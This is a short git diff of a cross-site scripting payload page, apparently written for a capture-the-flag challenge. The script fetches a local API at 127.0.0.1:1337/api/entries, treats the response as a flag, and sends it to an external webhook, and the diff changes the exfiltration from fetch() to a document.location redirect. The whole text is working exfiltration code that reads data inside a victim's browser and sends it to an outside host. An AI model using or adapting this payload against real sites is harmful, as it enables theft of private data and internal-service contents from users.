@@ -26,8 +26,8 @@ layout: xss
     function getFlag(webhook, flag) {
         /*flag = flag.substr(500);*/
         payload = JSON.stringify(flag);
-        fetch(webhook + payload).then(res => console.log("DONE", res));
-        /*document.location = webhook + payload;*/
+        /*fetch(webhook + payload).then(res => console.log("DONE", res));*/
+        document.location = webhook + payload;
     }
 
     let url = "https://127.0.0.1:1337/api/entries";
@@ -39,7 +39,7 @@ layout: xss
     /*let options = {
         mode: 'no-cors' // 'cors' by default
     };*/
-    fetch(url2)
+    fetch(url)
         .then(res => { console.log(res); return res.text(); })
         .then(text => { console.log(text); getFlag(webhook2, text) })
 </script>
